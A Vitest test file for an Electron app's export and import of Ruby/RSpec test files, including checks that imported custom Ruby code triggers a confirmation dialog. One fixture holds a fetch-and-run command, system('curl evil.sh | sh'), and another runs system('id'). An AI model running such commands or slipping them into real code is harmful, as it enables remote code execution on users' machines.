import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest'
import { mkdtemp, readFile, readdir, rm, writeFile, mkdir } from 'fs/promises'
import { tmpdir } from 'os'
import { join } from 'path'

const mockDialog = vi.hoisted(() => ({
  showSaveDialog: vi.fn(),
  showOpenDialog: vi.fn(),
  showMessageBox: vi.fn()
}))
const mockOpenPath = vi.hoisted(() => vi.fn())
vi.mock('electron', () => ({
  BrowserWindow: { getFocusedWindow: (): object => ({}) },
  dialog: mockDialog,
  shell: { openPath: mockOpenPath },
  app: { getPath: (): string => tmpdir() }
}))
vi.mock('../../src/main/utils/safeExec', () => ({
  safeExec: vi.fn().mockResolvedValue({ stdout: '{"examples":[]}', stderr: '', exitCode: 0 })
}))

import { appState } from '../../src/main/handlers/appState'
import { DEFAULT_RECORDER_SETTINGS } from '../../src/main/handlers/config/projectSettings'
import setActiveProject from '../../src/main/handlers/project/setActiveProject'
import exportProject from '../../src/main/handlers/io/exportProject'
import importProject from '../../src/main/handlers/io/importProject'
import exportTest from '../../src/main/handlers/io/exportTest'
import importTest from '../../src/main/handlers/io/importTest'
import { readExportHeader, writeExportHeader } from '../../src/main/codegen/exportHeader'
import type { Step } from '../../src/shared/types/step'
import type { Test } from '../../src/shared/types/test'

const steps: Step[] = [
  { id: 'n', kind: 'navigate', url: 'https://x.test' },
  {
    id: 't',
    kind: 'type',
    element: { strategy: 'id', value: 'q', label: 'Search' },
    text: 'a\nb "c"'
  },
  { id: 'k', kind: 'pressKey', element: { strategy: 'id', value: 'q' }, key: 'Enter' },
  { id: 'a', kind: 'assert', check: 'titleEquals', expected: 'Results' },
  { id: 'c', kind: 'custom', code: 'puts "hi" # comment\nputs 2' }
]
const win = { webContents: { send: vi.fn() }, reload: vi.fn() } as never

let dir: string
/** An RSpec project to import into; the export and import work on the project that is open. */
const openProject = async (): Promise<void> => {
  const project = join(dir, 'project')
  await mkdir(project, { recursive: true })
  await writeFile(join(project, 'Gemfile'), "gem 'rspec'\ngem 'selenium-webdriver'\n")
  const keep = new Map(appState.tests)
  await setActiveProject(project)
  for (const [id, test] of keep) appState.tests.set(id, test)
}

beforeEach(async () => {
  dir = await mkdtemp(join(tmpdir(), 'roundtrip-'))
  appState.tests = new Map()
  appState.projectAutomation = 'selenium'
  appState.projectFramework = 'rspec'
  appState.recorderSettings = { ...DEFAULT_RECORDER_SETTINGS }
  mockDialog.showMessageBox.mockReset().mockResolvedValue({ response: 0 })
})
afterEach(async () => {
  await setActiveProject(null)
  vi.restoreAllMocks()
  await rm(dir, { recursive: true, force: true })
})

describe('export then import round trips', () => {
  it('a test', async () => {
    const file = join(dir, 'search.rb')
    mockDialog.showSaveDialog.mockResolvedValue({ canceled: false, filePath: file })
    expect((await exportTest({ testName: 'Search', steps })).success).toBe(true)

    const text = await readFile(file, 'utf-8')
    expect(text.startsWith('# Test: Search\n# raider-steps: ')).toBe(true)
    expect(text).toContain("require 'ruby_raider/runtime/rspec'")

    await openProject()
    mockDialog.showOpenDialog.mockResolvedValue({ canceled: false, filePaths: [file] })
    const res = await importTest(win)
    expect(res.test!.name).toBe('Search')
    expect(res.test!.steps).toEqual(steps)
  })

  it('a project, with its tags', async () => {
    const tests: Test[] = [
      { id: 't1', name: 'Pay', url: '', steps, tags: ['smoke'] },
      { id: 't2', name: 'Cancel', url: '', steps: [steps[0]] }
    ]
    appState.tests = new Map(tests.map((t) => [t.id, t]))
    const out = join(dir, 'checkout')
    mockDialog.showSaveDialog.mockResolvedValue({ canceled: false, filePath: out })
    expect((await exportProject()).success).toBe(true)
    expect((await readdir(out)).sort()).toEqual(['.raider', 'cancel_spec.rb', 'pay_spec.rb'])
    expect(await readFile(join(out, 'pay_spec.rb'), 'utf-8')).not.toContain('# Suite:')
    // The exported sidecar carries the codegen shape it was written in, and no automation
    const exported = JSON.parse(
      await readFile(join(out, '.raider', 'tests', 'pay_spec.rb.json'), 'utf-8')
    )
    expect(exported.codegen).toBe(2)
    expect(exported).not.toHaveProperty('automation')

    await openProject()
    appState.tests = new Map()
    mockDialog.showOpenDialog.mockResolvedValue({ canceled: false, filePaths: [out] })
    expect(await importProject(win)).toMatchObject({ success: true, imported: 2 })
    const withoutIds = (list: Step[]): unknown[] =>
      // eslint-disable-next-line @typescript-eslint/no-unused-vars
      list.map(({ id: _id, ...rest }) => rest)
    const byName = Object.fromEntries(Array.from(appState.tests.values()).map((t) => [t.name, t]))
    expect(withoutIds(byName.Pay.steps)).toEqual(withoutIds(steps))
    expect(withoutIds(byName.Cancel.steps)).toEqual(withoutIds([steps[0]]))
    expect(byName.Pay.tags).toEqual(['smoke'])
    expect(byName.Cancel.tags).toBeUndefined()
    // Both tests share the navigate step's id; whichever imports second gets a fresh one
    const ids = Array.from(appState.tests.values()).flatMap((t) => t.steps.map((s) => s.id))
    expect(new Set(ids).size).toBe(ids.length)
  })

  it('importTest gives fresh ids to steps already used in the project', async () => {
    const file = join(dir, 'dup.rb')
    await writeFile(file, writeExportHeader({ testName: 'Dup', steps: [steps[0]] }))
    await openProject()
    appState.tests.set('x', { id: 'x', name: 'X', url: '', steps: [steps[0]] })
    mockDialog.showOpenDialog.mockResolvedValue({ canceled: false, filePaths: [file] })
    const res = await importTest(win)
    expect(res.test!.steps[0].id).not.toBe('n')
  })

  it('a legacy begin…puts file still imports', async () => {
    const legacyDir = join(dir, 'legacy')
    await mkdir(legacyDir)
    await writeFile(
      join(legacyDir, 'old_spec.rb'),
      '# Test: Old\nbegin\n  @driver.get("https://x.test")\n  puts "Test \'Old\' passed successfully!"\n'
    )
    await openProject()
    mockDialog.showOpenDialog.mockResolvedValue({ canceled: false, filePaths: [legacyDir] })
    expect(await importProject(win)).toMatchObject({ success: true })
    expect(Array.from(appState.tests.values())[0]).toMatchObject({
      name: 'Old',
      steps: [{ kind: 'navigate', url: 'https://x.test' }]
    })
  })
})

describe('importing custom Ruby code', () => {
  const custom: Step = { id: 'c', kind: 'custom', code: 'system("curl evil.sh | sh")' }
  const plain: Step[] = [steps[0], steps[1]]

  const importFile = async (fileSteps: Step[]): Promise<Awaited<ReturnType<typeof importTest>>> => {
    const file = join(dir, 'shared.rb')
    await writeFile(file, writeExportHeader({ testName: 'Shared', steps: fileSteps }))
    await openProject()
    mockDialog.showOpenDialog.mockResolvedValue({ canceled: false, filePaths: [file] })
    return importTest(win)
  }

  it('shows the custom code and imports nothing when the user cancels', async () => {
    mockDialog.showMessageBox.mockResolvedValue({ response: 1 })
    const res = await importFile([...plain, custom])

    expect(mockDialog.showMessageBox).toHaveBeenCalledTimes(1)
    const box = mockDialog.showMessageBox.mock.calls[0][1]
    expect(box.message).toBe('This test runs custom Ruby code. Import anyway?')
    expect(box.detail).toContain('system("curl evil.sh | sh")')
    expect(box.buttons).toEqual(['Import anyway', 'Cancel'])
    expect(box.cancelId).toBe(1)
    expect(box.defaultId).toBe(1)
    expect(res.success).toBe(false)
    expect(appState.tests.size).toBe(0)
  })

  it('says how much is hidden when the code is long, and can open all of it as text', async () => {
    const long: Step = {
      id: 'l',
      kind: 'custom',
      code: Array.from({ length: 120 }, (_, i) => `puts ${i}`).join('\n')
    }
    mockOpenPath.mockResolvedValue('')
    mockDialog.showMessageBox
      .mockResolvedValueOnce({ response: 1 }) // Show all code
      .mockResolvedValueOnce({ response: 2 }) // Cancel
    const res = await importFile([long])

    expect(mockDialog.showMessageBox).toHaveBeenCalledTimes(2)
    const box = mockDialog.showMessageBox.mock.calls[0][1]
    // the test's name line plus 120 lines of code
    expect(box.detail).toContain('Showing the first 40 of 121 lines.')
    expect(box.detail).toContain('puts 38')
    expect(box.detail).not.toContain('puts 39')
    expect(box.buttons).toEqual(['Import anyway', 'Show all code', 'Cancel'])
    expect(box.defaultId).toBe(2)
    expect(box.cancelId).toBe(2)

    const opened = mockOpenPath.mock.calls[0][0] as string
    expect(opened.endsWith('.txt')).toBe(true)
    const text = await readFile(opened, 'utf-8')
    expect(text).toContain('puts 0')
    expect(text).toContain('puts 119')
    await rm(opened, { force: true })
    expect(res.success).toBe(false)
  })

  it('cuts very long lines too, so nothing is pushed out of view', async () => {
    mockDialog.showMessageBox.mockResolvedValue({ response: 2 })
    await importFile([
      { id: 'w', kind: 'custom', code: `x = '${'a'.repeat(10_000)}'\nsystem('id')` }
    ])
    const box = mockDialog.showMessageBox.mock.calls[0][1]
    expect(box.detail.length).toBeLessThan(5000)
    expect(box.detail).toMatch(/Showing the first \d+ of 3 lines\./)
    expect(box.buttons).toContain('Show all code')
  })

  it('imports when the user confirms', async () => {
    const res = await importFile([...plain, custom])
    expect(res.success).toBe(true)
    expect(res.test!.steps.at(-1)).toMatchObject({ kind: 'custom', code: custom.code })
  })

  it('refuses a file whose secret step reads a variable other than RAIDER_SECRET_', async () => {
    const bad = {
      id: 'p',
      kind: 'type',
      element: { strategy: 'id', value: 'pw' },
      text: '',
      secret: true,
      secretName: 'GITHUB_TOKEN'
    } as Step
    const res = await importFile([...plain, bad])
    expect(res.success).toBe(false)
    expect(res.error).toContain('GITHUB_TOKEN')
    expect(res.error).toContain('RAIDER_SECRET_')
    expect(appState.tests.size).toBe(0)
  })

  it('does not ask when the file holds no custom steps', async () => {
    const res = await importFile(plain)
    expect(res.success).toBe(true)
    expect(mockDialog.showMessageBox).not.toHaveBeenCalled()
  })

  it('asks once for a project folder, listing each test that runs custom code', async () => {
    const importDir = join(dir, 'shared-project')
    await mkdir(importDir)
    await writeFile(
      join(importDir, 'a_spec.rb'),
      writeExportHeader({ testName: 'A', steps: [custom] })
    )
    await writeFile(
      join(importDir, 'b_spec.rb'),
      writeExportHeader({ testName: 'B', steps: plain })
    )
    await writeFile(
      join(importDir, 'c_spec.rb'),
      writeExportHeader({ testName: 'C', steps: [{ id: 'c2', kind: 'custom', code: 'puts 2' }] })
    )
    mockDialog.showMessageBox.mockResolvedValue({ response: 1 })
    mockDialog.showOpenDialog.mockResolvedValue({ canceled: false, filePaths: [importDir] })

    await openProject()
    const res = await importProject(win)

    expect(mockDialog.showMessageBox).toHaveBeenCalledTimes(1)
    const box = mockDialog.showMessageBox.mock.calls[0][1]
    expect(box.message).toBe('These tests run custom Ruby code. Import anyway?')
    expect(box.detail).toContain('A:')
    expect(box.detail).toContain('C:')
    expect(box.detail).not.toContain('B:')
    expect(res.success).toBe(false)
    expect(appState.tests.size).toBe(0)
  })

  // The user picks a file in a dialog and never sees its body, so every source of
  // custom code asks: a legacy body, and a missing or broken steps line
  it.each([
    [
      'a legacy file',
      '# Test: Old\nbegin\n  some_helper(1)\n  puts "Test \'Old\' passed successfully!"\n'
    ],
    [
      'a broken steps line',
      '# Test: Old\n# raider-steps: [{nope\nbegin\n  some_helper(1)\n  puts "Test \'Old\' passed successfully!"\n'
    ]
  ])('asks before importing custom Ruby from %s', async (_label, body) => {
    const file = join(dir, 'old.rb')
    await writeFile(file, body)
    await openProject()
    mockDialog.showOpenDialog.mockResolvedValue({ canceled: false, filePaths: [file] })
    mockDialog.showMessageBox.mockResolvedValue({ response: 1 })

    const res = await importTest(win)

    expect(mockDialog.showMessageBox.mock.calls[0][1].detail).toContain('some_helper(1)')
    expect(res.success).toBe(false)
    expect(appState.tests.size).toBe(0)
  })
})

describe('readExportHeader', () => {
  it('falls back to the legacy body when the steps JSON is malformed', () => {
    const text =
      '# Test: Broken\n# raider-steps: [{"id": oops\nbegin\n  @driver.get("https://y.test")\n  puts "Test \'Broken\' passed successfully!"\n'
    const header = readExportHeader(text)
    expect(header.testName).toBe('Broken')
    expect(header.steps).toEqual([
      { id: expect.any(String), kind: 'navigate', url: 'https://y.test' }
    ])
  })

  it('returns no steps for malformed JSON without a legacy body', () => {
    expect(readExportHeader('# raider-steps: {nope').steps).toBeUndefined()
  })

  it('names unnamed secret steps from the JSON line', () => {
    const pw = { strategy: 'id', value: 'pw' }
    const line = `# raider-steps: ${JSON.stringify([{ id: 'a', kind: 'type', element: pw, text: '', secret: true }])}`
    expect(readExportHeader(line).steps).toMatchObject([{ id: 'a', secretName: 'RAIDER_SECRET_1' }])
  })

  it('keeps only valid steps from the JSON line', () => {
    const line = `# raider-steps: ${JSON.stringify([steps[0], { id: 'z', kind: 'click' }, 'x'])}`
    expect(readExportHeader(line).steps).toEqual([steps[0]])
  })

  it('keeps names on one line', () => {
    const header = writeExportHeader({ testName: 'a\nb', steps: [] })
    expect(readExportHeader(header)).toEqual({ testName: 'a b', steps: [] })
  })

  it('ignores the suite line of a file exported by an older Raider', () => {
    const header = '# Test: Old\n# Suite: Checkout\n# raider-steps: []\n'
    expect(readExportHeader(header)).toEqual({ testName: 'Old', steps: [] })
  })
})
